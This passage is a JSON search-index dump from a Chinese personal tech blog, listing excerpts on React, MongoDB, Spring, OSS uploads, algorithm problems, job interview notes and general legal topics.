-子序列","lvl1":null,"lvl2":"摘要","objectID":"6c4598ca74d9fe92e752727538503cb1","tags":null,"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/%E7%AD%89%E5%B7%AE%E6%95%B0%E5%88%97%E5%88%92%E5%88%86ii-%E5%AD%90%E5%BA%8F%E5%88%97/"},{"content":"管理系统layout 总结 参考文档链接 视频 14分钟学习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44","lvl0":"管理系统 layout","lvl1":null,"lvl2":"摘要","objectID":"5eb105cc82ff0615a8ade8fb36144cf5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/antd%E4%BD%BF%E7%94%A8/%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/"},{"content":"搭建管理系统脚手架 参考学习项目 搭建路由 19分开始看 排版布局 参考视频","lvl0":"管理系统实战学习","lvl1":null,"lvl2":"摘要","objectID":"8dbcf15b1597eaf076d82beede6bcaf7","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/"},{"content":"红黑树、哈希表、堆 红黑树 红黑树的每个节点上都有存储位表示节点的颜色，可以是红(Red)或黑(Black)。 红黑树的特性: （1）每个节点或者是","lvl0":"红黑树、哈希表、堆【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"3c45d40cab9449ad8aff20338ccc145f","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E4%BB%A3%E7%A0%81%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%A2%E9%BB%91%E6%A0%91%E5%93%88%E5%B8%8C%E8%A1%A8%E5%A0%86/"},{"content":"项目练手 源码地址 包安装 1 2 3 4 5 6 7 npx create-react-app test_system_backend cd test_system_backend yarn yarn add react-router-dom npm start 1 2 3 4 5 6 7 8 yarn add antd yarn add react-router yarn add react-router-dom yarn add react-redux yarn add redux yarn add axios react 动态路由学习 创建路由 router 这里可","lvl0":"练手项目","lvl1":null,"lvl2":"摘要","objectID":"8b5ab34d231fb8fd01f6c65be48ecb68","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/%E7%BB%83%E6%89%8B/"},{"content":"自定义 hooks组件 监听 windows size 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import React, { useCallback, useEffect, useState } from \u0026#34;react\u0026#34;; function useWinSize() { const [size,setSize] = useState({ width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, }) const onResize = useCallback(()=\u0026gt;{ setSize({ width: document.documentElement.clientWidth,","lvl0":"自定义 hooks组件","lvl1":null,"lvl2":"摘要","objectID":"eb7127e35158531b2edce5a3f4cf6f0d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/%E8%87%AA%E5%AE%9A%E4%B9%89-hooks-%E7%BB%84%E4%BB%B6/"},{"content":"弹框表单组件 参考视频 6分钟 自定义表单高阶组件 参考视频-12分钟 17 分钟表单联动效果 ref.current 的使用方法 21 分钟表单校验修改","lvl0":"表单组件使用","lvl1":null,"lvl2":"摘要","objectID":"d18c345a6f7fca7861e4ffebc6ee6999","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/antd%E4%BD%BF%E7%94%A8/%E8%A1%A8%E5%8D%95%E7%BB%84%E4%BB%B6/"},{"content":"路由守卫授权 学习视频1——参考第8分钟， 13分钟 使用 react router-dom 来解决这个问题 1 cnpm i --save-dev react-router-dom 1 2 3 4 5 6 import IndexRouter from \u0026#39;./router/IndexRouter\u0026#39; function App() { return \u0026lt;div\u0026gt; \u0026lt;IndexRouter\u0026gt;\u0026lt;/IndexRouter\u0026gt; \u0026lt;/div\u0026gt; } 1 2 3 4 5 6 7 8 9 10 11 12","lvl0":"路由守卫授权","lvl1":null,"lvl2":"摘要","objectID":"f4972e19ba55146cdba4563a90675cd6","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/react/react%E5%9F%BA%E7%A1%80/%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB%E6%8E%88%E6%9D%83/"},{"content":"阿里OSS 断点续传 【后端 java代码】 断点续传思路 数据库记录最后传输成功的 那个 序列号 seq 客户端停止上传了 客户端重新上传，发送数据包给服务器校验","lvl0":"阿里OSS 断点续传","lvl1":null,"lvl2":"摘要","objectID":"5c84df99ddcd6347989db67306f654bb","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E9%98%BF%E9%87%8Coss-%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0%E5%AE%9E%E7%8E%B0/"},{"content":"阿里OSS 上传文件 参考别人写的代码 参考官方文档 阿里 oss追加上传 官方文档 分片上传官方文档 官方文档 - github-sample 下面是追加上传的例子 1 2 3 4 5 6 7 8 9 10","lvl0":"阿里OSS上传文件【官网文档】","lvl1":null,"lvl2":"摘要","objectID":"cd5c1217d4687c54ba1c16965d89333e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E9%98%BF%E9%87%8Coss%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"},{"content":"小白是一家 P2P 公司的 PHP 程序员，主要负责网页工作，为公司宣传、招揽客户。然而两个月前，公司的资金链断裂，高达上亿的资金迟迟不能到位，濒临破产。两","lvl0":"什么是非法集资","lvl1":["法律"],"lvl2":"摘要","objectID":"5b0e7832c5dded04e078e613bce80ac6","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E9%9D%9E%E6%B3%95%E9%9B%86%E8%B5%84/"},{"content":"首先我们要了解加班时间的规定。我们实行的是 8 小时工作制，但并没有禁止公司安排 8 小时外的加班，只不过，法律上要求，公司安排加班，必须符合《劳动","lvl0":"加班费怎么算？","lvl1":["法律"],"lvl2":"摘要","objectID":"e6bfe2276a08d0444ab887d26f20ee67","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E5%8A%A0%E7%8F%AD%E8%B4%B9%E6%80%8E%E4%B9%88%E7%AE%97/"},{"content":"非国家工作人员受贿罪 在过去，这个罪一直叫作“公司、企业人员受贿罪”，后来修改成了“非国家工作人员受贿罪”。名称上的变动，可以看出，新罪名针对","lvl0":"受贿法律问题","lvl1":["法律"],"lvl2":"摘要","objectID":"80b0aa9737bcfdb66404b7db5a161d0b","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E5%8F%97%E8%B4%BF%E7%9A%84%E6%B3%95%E5%BE%8B%E9%97%AE%E9%A2%98/"},{"content":"事实上，法律上有专门的几个名词，用来定义这样的行为，我们逐个来看。 第一个概念叫做商业信誉，比较好理解，是指企业在商业上获得的正面的社会评价，","lvl0":"商品信誉相关","lvl1":["法律"],"lvl2":"摘要","objectID":"1a56c6620acbbb315cdcbf7e1dce9861","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E5%95%86%E5%93%81%E4%BF%A1%E8%AA%89%E7%9B%B8%E5%85%B3/"},{"content":"创业公司确实不容易，老板起早贪黑，员工亦是没日没夜地干活。但这中间，一旦哪个环节出现问题，就有可能导致整个公司都崩盘。 小王去了一家 P2P 创业公司","lvl0":"打工人注意点","lvl1":["法律"],"lvl2":"摘要","objectID":"fc3eb59ab672684fc92fc542dffc099a","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E6%89%93%E5%B7%A5%E4%BA%BA%E6%B3%A8%E6%84%8F%E7%82%B9/"},{"content":"前不久某鹅厂 23 岁安全工程师的新闻，想必你不会陌生。年轻的工程师，因为对酒店的 Wi-Fi 系统顺手一测，又顺手一发给传播了出去，就被新加坡安全局给抓了。","lvl0":"网络安全问题","lvl1":["法律"],"lvl2":"摘要","objectID":"0037216a2d034c9dd5c707ee43d3114d","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"content":"现在创业公司员工的两大迷雾，无非是相当火热的“股权”和“期权”。前面我们学完股权内容后，不少留言都在问，期权究竟是怎么回事，离职后期权要怎么","lvl0":"股权","lvl1":["法律"],"lvl2":"摘要","objectID":"3fe627d70042a0ed63f8a1328b45b1fe","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E8%82%A1%E6%9D%83/"},{"content":"第八问：中级法院作出二审民事判决后，我对结果仍然不服，还能再继续起诉吗？应该如何维权？ 老周答：我国法院审理普通程序的案件，实行的是两审终审制","lvl0":"诉讼的注意点","lvl1":["法律"],"lvl2":"摘要","objectID":"f9cec640d15eed2343d6a4735e59cec6","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/05.%E6%B3%95%E5%BE%8B/%E8%AF%89%E8%AE%BC%E7%9A%84%E6%B3%A8%E6%84%8F%E7%82%B9/"},{"content":"spring的scope有几种 @component 默认是那种 spring mvc整个流程 int i1 = 10000, int i2 = 10000 两个是否相等（相等） 两个Integer大于或等于128时是不等的，","lvl0":"同学的面试","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"31e7a91e8a0a50328b79dae5a94c7d1f","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/11.%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E8%AF%95/"},{"content":"实在没想到，居然可以进三面，三面没问技术，只问了我一些项目啊和团队合作相关的东西。 自我介绍 人数最多的团队有多少人 你是怎么和别人合作的（需不需","lvl0":"腾讯（三面）","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"21475bd807ccc64047d752ed5756ba82","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/10.%E8%85%BE%E8%AE%AF%E4%B8%89%E9%9D%A2/"},{"content":"本来我都以为我要凉了的。。当时笔试完后去官网看了一下，流程结束了。今天本来打算摸会鱼的。。。突然给我发封邮件，说面试。。。可能是被捞了。搞得","lvl0":"腾讯（二面）","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"513a375517115b88200689d85d19db82","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/09.%E8%85%BE%E8%AE%AF%E4%BA%8C%E9%9D%A2/"},{"content":"这次汉得是在腾讯会议上面的，其实没问啥，大部分时间都在讲项目，还好我是做过项目的，所以我直接给它看了jenkins然后他让我打开项目，讲一下","lvl0":"汉得（一面）","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"48989c4ba424dc0789d5d43718ec1470","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/08.%E6%B1%89%E5%BE%97%E4%B8%80%E9%9D%A2/"},{"content":"说到这个结构，就不得不提一下安卓的几大结构吧主要包括 MVC、MVP、MVVM 这三大结构 MVC结构 Model ：实体模型、数据的获取、存储等等 View ：Act","lvl0":"MVVM架构","lvl1":["程序语言","Android相关"],"lvl2":"摘要","objectID":"6b1d8cf8e2e3404200cbf8bc06183d37","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/05.android%E7%9B%B8%E5%85%B3/01.mvvm%E6%9E%B6%E6%9E%84/"},{"content":"这次体验极其不友好，首先就是阿里这边卡我流程，我从3月21号投递，然后就被拒了。。。后面不知道咋回事招聘动态显示的是新投递（4号2号申请的。","lvl0":"阿里（一面）","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"333fd5a00b8300293974c8fa15adcf99","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/07.%E9%98%BF%E9%87%8C%E4%B8%80%E9%9D%A2/"},{"content":"Java核心技术 卷一 基本数据结构 java break可以带标签 大数值可以使用bigInteger和bigDecimal for each使用 1 2 3 for (int a:new int[]{1,2,3}){ System.out.println(a);","lvl0":"Java书籍学习笔记","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"580ec659755a4f1563fd8cf3ae5f92a4","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/13.java%E4%B9%A6%E7%B1%8D%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"content":"对象图有几种 UML大科普：一文梳理清 14种 UML图！ (yinxiang.com) UML图分为结构图和行为图。 结构图分为类图、轮廓图、组件图、组合结构图、对象图、部署图","lvl0":"面试问题","lvl1":["基础学科","软件工程"],"lvl2":"摘要","objectID":"b84c7086cca313601e2e56c932446114","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/03.%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/01.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/"},{"content":"1.生成格雷码 生成格雷码_牛客题霸_牛客网 (nowcoder.com) 先理解一下格雷码的定义吧，我拿n为3举例，当n为3时，我们生成的格雷码如下 1 [000, 001, 011, 010, 110, 111, 101, 100] 任意","lvl0":"腾讯","lvl1":["算法和数据结构","笔试题目"],"lvl2":"摘要","objectID":"8fa39072c6d1cee396dd8dd09553a100","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/09.%E7%AC%94%E8%AF%95%E9%A2%98%E7%9B%AE/01.%E8%85%BE%E8%AE%AF/"},{"content":"1.反转链表 206. 反转链表 - 力扣（LeetCode） (leetcode-cn.com) 这题考察的就是你对递归和迭代的综合运用 解法一：递归 这递归好久没做了，还有有点蒙，下面我简单","lvl0":"腾讯","lvl1":["算法和数据结构","CodeTop企业题库"],"lvl2":"摘要","objectID":"f1eb2904b798778df36d2aae200400b5","tags":null,"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/08.codetop%E4%BC%81%E4%B8%9A%E9%A2%98%E5%BA%93/01.%E8%85%BE%E8%AE%AF/"},{"content":"https中间人攻击 如何防止请求被篡改 使用https来进行请求（这点我居然没想到。。） 设置客户端白名单，客户端所有请求，请求到代理服务器(n","lvl0":"网络安全","lvl1":["其他","安全相关"],"lvl2":"摘要","objectID":"b0489c62ba02be2cf9a35fec759502f4","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/04.%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/01.%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"content":"跨域问题怎么处理 通过jsonp跨域 document.domain + iframe跨域 location.hash + iframe window.name + iframe跨域 postMessage跨域 跨域资源共享（CORS） nginx","lvl0":"前端","lvl1":["程序语言","JavaScript和HTML"],"lvl2":"摘要","objectID":"054a15563b55ed4117e965b6958e0a7c","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/04.javascript%E5%92%8Chtml/03.%E5%89%8D%E7%AB%AF/"},{"content":"优化相关 怎么优化界面，让用户体验更好 减少 HTTP 请求 使用 HTTP2 使用服务端渲染 客户端渲染: 获取 HTML 文件，根据需要下载 JavaScript 文件，运行文件，生成 DOM，再渲染。","lvl0":"HTML","lvl1":["程序语言","JavaScript和HTML"],"lvl2":"摘要","objectID":"ff6f55b3ff7ecbbfabc812987f439c2b","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/04.javascript%E5%92%8Chtml/02.html/"},{"content":"这面不知道为啥感觉好水，，，，都没问我啥难的东西。。。有点谎，不知道结果怎么样 TCP和UDP 运输层(TCP,UDP) | 面试问题浓缩总结 (xiaoyou66.com) TC","lvl0":"字节（二面）","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"fe6980b222dd4ffc23bf1c9a40e35c10","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/06.%E5%AD%97%E8%8A%82%E4%BA%8C%E9%9D%A2/"},{"content":"JavaScript事件机制 DOM事件流（event flow ）存在三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段。 事件捕获（event capt","lvl0":"JavaScript","lvl1":["程序语言","JavaScript"],"lvl2":"摘要","objectID":"cc54425e36a7640945b2f887d41599a5","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/04.javascript%E5%92%8Chtml/01.javascript/"},{"content":"this指针是干嘛的 其作用就是指向成员函数所作用的对象， 所以非静态成员函数中可以直接使用 this 来代表指向该函数作用的对象的指针。 静态成员函数是不","lvl0":"面试常问问题","lvl1":["程序语言","CC++语言"],"lvl2":"摘要","objectID":"010778ad897c422de2bb0aed6468d054","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/03.cc++%E8%AF%AD%E8%A8%80/02.%E9%9D%A2%E8%AF%95%E5%B8%B8%E9%97%AE%E9%97%AE%E9%A2%98/"},{"content":"我太难了，一直在背后端的东西，突然来个前端的，我心态崩了。。。我太难了，前端的有时间也去看看吧 go的协程 经典问题，不多说 协程调度，GPM调度","lvl0":"腾讯（一面）","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"25716e1f1c1efcdfddc46f3522c708ca","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/05.%E8%85%BE%E8%AE%AF%E4%B8%80%E9%9D%A2/"},{"content":"一致性哈希 传统哈希 当数据太大而无法存储在一个节点或机器上时，我们就需要把数据放在多台服务器上，这个时候我们就可以简单使用取模运算来实现简单的","lvl0":"分布式系统相关","lvl1":["软件和系统","系统相关"],"lvl2":"摘要","objectID":"d8d6fe2f755217d0d19dbdeab379e085","tags":[""],"url":"https://lyr-2000.github.io/post/05.%E8%BD%AF%E4%BB%B6%E5%92%8C%E7%B3%BB%E7%BB%9F/02.%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/03.%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3/"},{"content":"给定一个 1-7随机数生成器 如何生成1-10随机数并验证？ 力扣上有一样的题目 470. 用 Rand7() 实现 Rand10() - 力扣（LeetCode） (leetcode-cn.com) 我们可以使用拒绝采样的方法","lvl0":"面试问的一些算法","lvl1":["算法和数据结构","算法"],"lvl2":"摘要","objectID":"d444e1211a1c103ee193e1d7629aeac0","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/01.%E7%AE%97%E6%B3%95/04.%E9%9D%A2%E8%AF%95%E9%97%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%97%E6%B3%95/"},{"content":"64匹马，8个赛道，找出跑得最快的4匹马 全部马分为8组，每组8匹，每组各跑一次，然后淘汰掉每组的后四名，如下图（需要比赛8场） 第一步 因为我们","lvl0":"面试常问","lvl1":["其他","智力题"],"lvl2":"摘要","objectID":"7e651f49556d111818b038ecfbccd407","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/01.%E6%99%BA%E5%8A%9B%E9%A2%98/02.%E9%9D%A2%E8%AF%95%E5%B8%B8%E9%97%AE/"},{"content":"特地在牛客上看了100多篇面经，目的就是为了看一下go到底能问多少东西。这一轮看下来发现东西还是很多的，有些东西不好整理，所以我就统一放这里","lvl0":"牛客面经总结","lvl1":["个人面试","4月份面试"],"lvl2":"摘要","objectID":"5f92b110ba6bfaf5052dd9035091e28f","tags":[""],"url":"https://lyr-2000.github.io/post/07.%E4%B8%AA%E4%BA%BA%E9%9D%A2%E8%AF%95/02.4%E6%9C%88%E4%BB%BD%E9%9D%A2%E8%AF%95/04.%E7%89%9B%E5%AE%A2%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"},{"content":"01.01判断字符串是否唯一 面试题 01.01. 判定字符是否唯一 - 力扣（LeetCode） (leetcode-cn.com) 解法一： 使用map 这个方法虽然很简单，但是面试不推荐的话不推","lvl0":"1-10","lvl1":["算法和数据结构","程序员面试"],"lvl2":"摘要","objectID":"979452d93c75ce348cc94301454e39ac","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/07.%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95/1.1-10/"},{"content":"","lvl0":"10-20","lvl1":["算法和数据结构","程序员面试"],"lvl2":"摘要","objectID":"331cff7c9532990e90a27bb60879cef2","tags":[""],"url":"https://lyr-2000.github.io/post/06.%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/07.%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95/2.10-20/"},{"content":"常用的注解 @SpringBootApplication 这个注解我们一般不会主动使用它，但是它却是springboot项目的基石，创建 SpringBoot 项目之后会默认在主类加上。 我们可以把 @Sprin","lvl0":"注解相关","lvl1":["框架","spring全家桶"],"lvl2":"摘要","objectID":"1649ad5629cec0af9dc94a24718999e9","tags":[""],"url":"https://lyr-2000.github.io/post/04.%E6%A1%86%E6%9E%B6/01.spring%E5%85%A8%E5%AE%B6%E6%A1%B6/9.%E6%B3%A8%E8%A7%A3%E7%9B%B8%E5%85%B3/"},{"content":"04. Hook规则 Hook 本质就是 JavaScript 函数，但是在使用它时需要遵循两条规则。我们提供了一个 linter 插件来强制执行这些规则： 只在最顶层使用 Hook 不要在循环，条件或嵌","lvl0":"Hook规则","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"8caacfd9166a988fd06ec5b146a919d3","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/04.hook%E8%A7%84%E5%88%99/"},{"content":"03. 使用Effect Hook（副作用钩子） 如果你熟悉 React class 的生命周期函数，你可以把 useEffect Hook 看做 componentDidMount(挂载完成)，com","lvl0":"使用Effect Hook","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"add11e584e80349bab812ed01d73e17d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/03.%E4%BD%BF%E7%94%A8effect-hook/"},{"content":"02. 使用State Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import React, { useState } from \u0026#39;react\u0026#39;; function Example() { // 声明一个叫 \u0026#34;count\u0026#34; 的 state 变量 const [count, setCount] = useState(0); return ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;You clicked {count} times\u0026lt;/p\u0026gt; \u0026lt;button onClick={() =\u0026gt; setCount(count + 1)}\u0026gt; Click me \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); } 我","lvl0":"使用State Hook","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"7e9ab5e038ad0c93531a50c70f075d25","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/02.%E4%BD%BF%E7%94%A8state-hook/"},{"content":"05. 自定义 Hook 通过自定义 Hook，可以将组件逻辑提取到可重用的函数中。 目前为止，在 React 中有两种流行的方式来共享组件之间的状态逻辑: render props 和高阶组件，","lvl0":"自定义 Hook","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"3639b54a312ca63051c9496120951714","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/05.%E8%87%AA%E5%AE%9A%E4%B9%89-hook/"},{"content":"常用操作命令 数据库操作命令 1 2 3 4 5 6 7 8 9 10 11 12 13 # 查看数据库 show dbs; # 切换数据库（如果没有对应的数据库则创建） use 数据库名; # 创建集合 db.c","lvl0":"常用命令","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"64d8febf5dba40efe8deae9294e7f47c","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/6.%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"content":"MongoDB体系结构 MongoDB的体系结构如下所示：磁盘文件经过加载之后后形成 MongoDB 实例，一个 MongoDB 实例中可以存放多个数据库（图中的MongoD","lvl0":"体系和架构","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"db105970320b167eeff46af9a9c96041","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/5.%E4%BD%93%E7%B3%BB%E5%92%8C%E6%9E%B6%E6%9E%84/"},{"content":"MongoDB集群 MongoDB有三种集群的搭建方式 Replica Set 副本集 Sharding 切片 Master-Slaver 主从（不推荐使用） 其中，Sharding集群也是三种集群中最复杂的。副","lvl0":"分布式和集群","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"f64ef9625ee95b86a21e7a6e5a0339ed","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/4.%E5%88%86%E5%B8%83%E5%BC%8F%E5%92%8C%E9%9B%86%E7%BE%A4/"},{"content":"MongoDB也是有索引的 索引是对数据库一列或多列值进行排序的存储结构，底层一般是一种树状结构，没有索引查询会进行全表扫描，数据量大的时候会","lvl0":"索引","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"7de1c56c6f6efebb9fa7b01f67c4c6fb","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/3.%E7%B4%A2%E5%BC%95/"},{"content":"存储引擎介绍 MongoDB支持的引擎有：WiredTiger，MMAPv1和In-Memory。 从MongoDB 3.2 版本开始，WiredTig","lvl0":"存储引擎","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"bf411955f503fa443ac026ac58328fe3","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/2.%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"content":"springboot启动 springboot启动类上的注解 一般来说我们的启动类需要有下面这几个注解 @SpringBootApplication 